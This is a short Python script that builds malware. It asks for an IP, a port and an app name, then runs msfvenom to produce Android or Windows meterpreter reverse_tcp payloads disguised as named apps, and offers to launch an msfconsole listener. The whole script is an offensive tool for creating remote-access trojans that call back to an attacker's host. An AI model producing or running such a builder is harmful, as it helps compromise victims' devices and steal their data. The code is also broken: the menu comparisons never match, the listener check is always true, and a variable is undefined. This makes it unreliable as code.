import os 
import time

#This will list all the files in present #working directory 


num = input('''

[1] ==> android payload

[2] ==> windows payload

''')





host = input('enter ip :')
print(' ')
port = input('enter port :')
print(' ')
name = input('enter app name :')
print(' ')
print('wait payload creating... ')
print(' ')

androi = '''msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} R > {}.apk'''.format(host, port, name)




window = '''msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > {}.exe'''.format(host, port, name)







if num==1:
    os.system(androi) 
    

if num==2:
    os.system(window)
    

time.sleep(25)
h = 'msfconsole'
y =input('want to start listner (y/s) ==> ')
print(' ')
if y==y:
    os.system(h)
    
if y==n:
    exit()


